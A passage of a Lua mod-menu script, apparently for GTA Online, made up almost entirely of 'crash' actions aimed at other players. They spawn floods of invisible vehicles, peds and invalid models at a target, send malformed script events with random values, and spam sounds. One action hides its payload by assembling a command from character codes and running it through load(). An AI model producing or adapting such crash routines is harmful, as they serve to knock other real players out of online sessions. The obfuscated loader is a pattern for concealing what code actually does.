        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
        util.yield(2500)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(user, true)
    end)
end)

menu.action(nmcrashes, "Yatch V3", {"bigyachtyv3"}, "Crash event (A1:1A7AEACE) sending prop yacht002.", function()
    local user = PLAYER.GET_PLAYER_PED(players.user())
    local model = util.joaat("h4_yacht_refproxy002")
    local pos = players.get_position(pid)
    local oldPos = players.get_position(players.user())
    ryze.BlockSyncs(pid, function()
        util.yield(100)
        ENTITY.SET_ENTITY_VISIBLE(user, false)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
        PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
        util.yield(500)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
        util.yield(2500)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(user, true)
    end)
end)

menu.action(nmcrashes, "Yatch V4", {"bigyachtyv4"}, "Crash event (A1:408D3AA0) sending prop apayacht.", function()
    local user = PLAYER.GET_PLAYER_PED(players.user())
    local model = util.joaat("h4_mp_apa_yacht")
    local pos = players.get_position(pid)
    local oldPos = players.get_position(players.user())
    ryze.BlockSyncs(pid, function()
        util.yield(100)
        ENTITY.SET_ENTITY_VISIBLE(user, false)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
        PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
        util.yield(500)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
        util.yield(2500)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(user, true)
    end)
end)

menu.action(nmcrashes, "Yatch V5", {"bigyachtyv5"}, "Crash event (A1:B36122B5) sending the prop yachtwin.", function()
    local user = PLAYER.GET_PLAYER_PED(players.user())
    local model = util.joaat("h4_mp_apa_yacht_win")
    local pos = players.get_position(pid)
    local oldPos = players.get_position(players.user())
    ryze.BlockSyncs(pid, function()
        util.yield(100)
        ENTITY.SET_ENTITY_VISIBLE(user, false)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
        PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
        util.yield(500)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
        util.yield(2500)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(user, true)
    end)
end)

local c
c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
local kitteh_hash = util.joaat("a_c_cat_01")
ryze.request_model_load(kitteh_hash)

local crash_tbl = {
    "SWYHWTGYSWTYSUWSLSWTDSEDWSRTDWSOWSW45ERTSDWERTSVWUSWS5RTDFSWRTDFTSRYE",
    "6825615WSHKWJLW8YGSWY8778SGWSESBGVSSTWSFGWYHSTEWHSHWG98171S7HWRUWSHJH",
    "GHWSTFWFKWSFRWDFSRFSRTDFSGICFWSTFYWRTFYSSFSWSYWSRTYFSTWSYWSKWSFCWDFCSW",
}

local crash_tbl_2 = {
    {17, 32, 48, 69},
    {14, 30, 37, 46, 47, 63},
    {9, 27, 28, 60}
}

crash2_ref:action("Femboy Cwash", {"cwash"}, "I dont know if stils cwashes the pwayer.", function()
    if pid == players.user() then 
        util.toast('nya nya! you cant cwash youwself.. >_<')
        return 
    end

    if pid == players.get_host() then 
        util.toast('nya nya.. unfowtunatewy, u cannot cwash the host >_<')
        return
    end

    local cur_crash_meth = ""
    local cur_crash = ""
    for a,b in pairs(crash_tbl_2) do
        cur_crash = ""
        for c,d in pairs(b) do
            cur_crash = cur_crash .. string.sub(crash_tbl[a], d, d)
        end
        cur_crash_meth = cur_crash_meth .. cur_crash
    end

    local crash_keys = {"NULL", "VOID", "NaN", "127563/0", "NIL"}
    local crash_table = {109, 101, 110, 117, 046, 116, 114, 105, 103, 103, 101, 114, 095, 099, 111, 109, 109, 097, 110, 100, 115, 040}
    local crash_str = ""

    for k,v in pairs(crash_table) do
        crash_str = crash_str .. string.char(crash_table[k])
    end

    for k,v in pairs(crash_keys) do
        print(k + (k*128))
    end

    c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    ryze.request_model_load(kitteh_hash)
    local kitteh = entities.create_ped(28, kitteh_hash, c, math.random(0, 270))
    AUDIO.PLAY_PAIN(kitteh, 7, 0)
    menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(players.user()))
    ryze.cwash_in_progwess()
    util.yield(500)
    for i=1, math.random(10000, 12000) do
    end
    local crash_compiled_func = load(crash_str .. '\"' .. cur_crash_meth .. PLAYER.GET_PLAYER_NAME(pid) .. '\")')
    pcall(crash_compiled_func)
    util.toast('bye bye! nya nya >_<')
end)

crash2_ref:action("Host Crash (only for host)", { "" }, "", function()
    local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    menu.trigger_commands("tpmazehelipad")
    ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
    util.yield(1000)
    menu.trigger_commands("tpmazehelipad")
end)

local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
pos.z = pos.z + 10
veh = entities.get_all_vehicles_as_handles()

crash2_ref:action("5G Crash", { "" }, "", function()
    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
    pos.z = pos.z + 10
    veh = entities.get_all_vehicles_as_handles()

    for i = 1, #veh do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
        TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
        TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
    end
end)

crash2_ref:action("Yi Yu Crash", { "" }, "", function()
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local Object_jb1 = CreateObject(0xD75E01A6, TargetPlayerPos)
    local Object_jb2 = CreateObject(0x675D244E, TargetPlayerPos)
    local Object_jb3 = CreateObject(0x799B48CA, TargetPlayerPos)
    local Object_jb4 = CreateObject(0x68E49D4D, TargetPlayerPos)
    local Object_jb5 = CreateObject(0x66F34017, TargetPlayerPos)
    local Object_jb6 = CreateObject(0xDE1807BB, TargetPlayerPos)
    local Object_jb7 = CreateObject(0xC4C9551E, TargetPlayerPos)
    local Object_jb8 = CreateObject(0xCF37BA1F, TargetPlayerPos)
    local Object_jb9 = CreateObject(0xB69AD9F8, TargetPlayerPos)
    local Object_jb10 = CreateObject(0x5D750529, TargetPlayerPos)
    local Object_jb11 = CreateObject(0x1705D85C, TargetPlayerPos)
    for i = 0, 1000 do
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
            , true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
            , true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
            , true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
            , true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb5, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
            , true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb6, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
            , true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb7, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
            , true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb8, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
            , true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb9, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false
            , true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb10, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
            false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb11, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
            false, true, true)
        util.yield(10)
    end
    util.yield(5500)
    entities.delete_by_handle(Object_jb1)
    entities.delete_by_handle(Object_jb2)
    entities.delete_by_handle(Object_jb3)
    entities.delete_by_handle(Object_jb4)
    entities.delete_by_handle(Object_jb5)
    entities.delete_by_handle(Object_jb6)
    entities.delete_by_handle(Object_jb7)
    entities.delete_by_handle(Object_jb8)
    entities.delete_by_handle(Object_jb9)
    entities.delete_by_handle(Object_jb10)
    entities.delete_by_handle(Object_jb11)
end)

crash2_ref:action("Bro Hug?", { "" }, "By MMT", function()
    util.toast("I'll try to convince them to leave :) ")
    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(), 0xE5022D03)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    util.yield(20)
    local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), p_pos.x, p_pos.y, p_pos.z
        , false, true, true)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
    TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), -1087, -3012, 13.94)
    util.yield(500)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    util.yield(1000)
    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
end)

crash2_ref:action("iz5mc kill mom crash V1", { "iznmsl" }, "", function()
    local int_min = -2147483647
    local int_max = 2147483647
    for i = 1, 150 do
        util.trigger_script_event(1 << pid,
            { 2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max),
                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max) })
    end
    util.yield()
    for i = 1, 15 do
        util.trigger_script_event(1 << pid, { 1348481963, pid, math.random(int_min, int_max) })
    end
    menu.trigger_commands("givesh " .. players.get_name(pid))
    util.yield(100)
    util.trigger_script_event(1 << pid, { 495813132, pid, 0, 0, -12988, -99097, 0 })
    util.trigger_script_event(1 << pid, { 495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203 })
    util.trigger_script_event(1 << pid,
        { 495813132, pid, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8,
            827870001, 9, 17 })
            util.yield(1000)
end)
crash2_ref:action("iz5mc kill mom crash V2", { "" }, "", function()
    for i = 1, 10 do
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local cord = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        STREAMING.REQUEST_MODEL(-930879665)
        util.yield(10)
        STREAMING.REQUEST_MODEL(3613262246)
        util.yield(10)
        STREAMING.REQUEST_MODEL(452618762)
        util.yield(10)
        while not STREAMING.HAS_MODEL_LOADED(-930879665) do util.yield() end
        while not STREAMING.HAS_MODEL_LOADED(3613262246) do util.yield() end
        while not STREAMING.HAS_MODEL_LOADED(452618762) do util.yield() end
        local a1 = entities.create_object(-930879665, cord)
        util.yield(10)
        local a2 = entities.create_object(3613262246, cord)
        util.yield(10)
        local b1 = entities.create_object(452618762, cord)
        util.yield(10)
        local b2 = entities.create_object(3613262246, cord)
        util.yield(300)
        entities.delete_by_handle(a1)
        entities.delete_by_handle(a2)
        entities.delete_by_handle(b1)
        entities.delete_by_handle(b2)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(452618762)
        util.yield(10)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3613262246)
        util.yield(10)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-930879665)
        util.yield(10)
    end
    if SE_Notifications then
        notification("Finished.", colors.red)
    end
end)
crash2_ref:action("iz5mc kill mom crash V3", { "" }, "", function()
    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
    pos.z = pos.z + 10
    veh = entities.get_all_vehicles_as_handles()

    for i = 1, #veh do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
        TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
        TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
    end
end)


crash2_ref:action("Medusa crash", { "" }, "", function()
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local plauuepos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    plauuepos.x = plauuepos.x + 5
    plauuepos.z = plauuepos.z + 5
    local hunter = {}
    for i = 1, 3 do
        for n = 0, 120 do
            hunter[n] = CreateVehicle(1077420264, plauuepos, 0)
            util.yield(0)
            ENTITY.FREEZE_ENTITY_POSITION(hunter[n], true)
            util.yield(0)
            VEHICLE.EXPLODE_VEHICLE(hunter[n], true, true)
        end
        util.yield(190)
        for i = 1, #hunter do
            if hunter[i] ~= nil then
                entities.delete_by_handle(hunter[i])
            end
        end
    end
    util.toast("Crash done QWQ")
    menu.trigger_commands("anticrashcam off")
    hunter = nil
    plauuepos = nil
end)

crash2_ref:action("NPC Crash", { "" }, "", function()
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SpawnPed_Wade = {}
    for i = 1, 60 do
        SpawnPed_Wade[i] = CreatePed(26, util.joaat("PLAYER_ONE"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        util.yield(1)
    end
    util.yield(5000)
    for i = 1, 60 do
        entities.delete_by_handle(SpawnPed_Wade[i])
        menu.trigger_commands("anticrashcam off")
    end
end)

crash2_ref:action("Invalid Appearance Crash", { "" }, "", function()
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
    local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos,
        ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    for i = 0, 500 do
        PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
        ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false,
            false, true);
        util.yield(10)
    end
    entities.delete_by_handle(Spawned_Mike)
    menu.trigger_commands("anticrashcam off")
end)

crash2_ref:action("Invalid model crashes", { "" }, "", function()
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
    local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
    local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
    local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
    for i = 0, 100 do
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
            false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
            false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
            false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
            false, true, true)
        util.yield(10)
    end
    util.yield(2000)
    entities.delete_by_handle(Object_pizza1)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza3)
    entities.delete_by_handle(Object_pizza4)
    menu.trigger_commands("anticrashcam off")
end)


crash2_ref:click_slider("Sound Crash", {}, "", 1, 2, 1, 1, function(on_change)
    if on_change == 1 then
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
                    'MP_MISSION_COUNTDOWN_SOUNDSET', true, 10000, false)
            end
            util.yield()
        end
    end
    if on_change == 2 then
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 1000
        while time > util.current_time_millis() do
            local pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            for i = 1, 20 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Object_Dropped_Remote', pos.x, pos.y, pos.z,
                    'GTAO_FM_Events_Soundset', true, 10000, false)
            end
            util.yield()
        end
    end
end)

crash2_ref:action("Ghost Crash", { "" }, "", function()
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    local Spawned_tr3 = CreateVehicle(util.joaat("tr3"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed),
        true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_tr3, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(Spawned_tr3, false, 0)
    local Spawned_chernobog = CreateVehicle(util.joaat("chernobog"), SelfPlayerPos,
        ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_chernobog, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0,
        true)
    ENTITY.SET_ENTITY_VISIBLE(Spawned_chernobog, false, 0)
    local Spawned_avenger = CreateVehicle(util.joaat("avenger"), SelfPlayerPos,
        ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_avenger, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(Spawned_avenger, false, 0)
    for i = 0, 100 do
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false
            , false)
        util.yield(10 * math.random())
        ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, true, false, false)
        util.yield(10 * math.random())
    end
    menu.trigger_commands("anticrashcam off")
end)

crash2_ref:action("SE Crash", {}, "Crash player with SE", function()
    util.trigger_script_event(1 << PlayerID, { 962740265, PlayerID, 115831, 9999449 })
end)

crash2_ref:action("Invalid Entity Crash", {}, "Crash player with invalid entity", function()
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SpawnPed_slod_small_quadped = CreatePed(26, util.joaat("slod_small_quadped"), TargetPlayerPos,
        ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    local SpawnPed_slod_large_quadped = CreatePed(26, util.joaat("slod_large_quadped"), TargetPlayerPos,
        ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    local SpawnPed_slod_human = CreatePed(26, util.joaat("slod_human"), TargetPlayerPos,
        ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    util.yield(2000)
    entities.delete_by_handle(SpawnPed_slod_small_quadped)
    entities.delete_by_handle(SpawnPed_slod_large_quadped)
    entities.delete_by_handle(SpawnPed_slod_human)
    menu.trigger_commands("anticrashcam off")
end)

crash2_ref:action("Invalid Object Crash", {}, "Crash player with invalid object", function()
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
    local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
    local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
    local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
    for i = 0, 100 do
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
            false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
            false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
            false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z,
            false, true, true)
        util.yield(10)
    end
    util.yield(2000)
    entities.delete_by_handle(Object_pizza1)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza3)
    entities.delete_by_handle(Object_pizza4)
    menu.trigger_commands("anticrashcam off")
end)

crash2_ref:action("Chernobog Crash", {}, "Crash player with chernobog", function()
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    SpawnedVehicleList = {};
    for i = 1, 80 do
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
        SpawnedVehicleList[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList[i], true)
        ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList[i], false, 0)
        util.yield(50)
    end
    util.yield(5000)
    for i = 1, 80 do
        entities.delete_by_handle(SpawnedVehicleList[i])
    end
    menu.trigger_commands("anticrashcam off")
end)

crash2_ref:action("Hunter Crash", {}, "Crash player with hunter", function()
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SpawnedVehicleList = {};
    for i = 1, 60 do
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        SpawnedVehicleList[i] = CreateVehicle(util.joaat("hunter"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList[i], true)
        ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList[i], false, 0)
        util.yield(50)
    end
    util.yield(5000)
    for i = 1, 60 do
        entities.delete_by_handle(SpawnedVehicleList[i])
    end
    menu.trigger_commands("anticrashcam off")
end)

crash2_ref:action("Chernobog Pro Crash", {}, "Crash player with chernobog pro", function()
    menu.trigger_commands("anticrashcam on")

    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    TargetPlayerPos.y = TargetPlayerPos.y + 1050
    SpawnedVehicleList1 = {};
    for i = 1, 60 do
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
        SpawnedVehicleList1[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList1[i], true)
        ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList1[i], false, 0)
        util.yield(50)
    end
    util.yield(2000)
    for i = 1, 60 do
        entities.delete_by_handle(SpawnedVehicleList1[i])
    end

    util.yield(1000)
    SpawnedVehicleList2 = {};
    for i = 1, 50 do
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
        SpawnedVehicleList2[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos,
            ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList2[i], true)
        ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList2[i], false, 0)
        util.yield(50)
    end
    util.yield(2000)
    for i = 1, 50 do
        entities.delete_by_handle(SpawnedVehicleList2[i])
    end

    menu.trigger_commands("anticrashcam off")
end)

crash2_ref:action("Wade Crash", {}, "Crash player with wade", function()
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SpawnPed_Wade = {}
    for i = 1, 50 do
        SpawnPed_Wade[i] = CreatePed(50, 0xDFE443E5, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
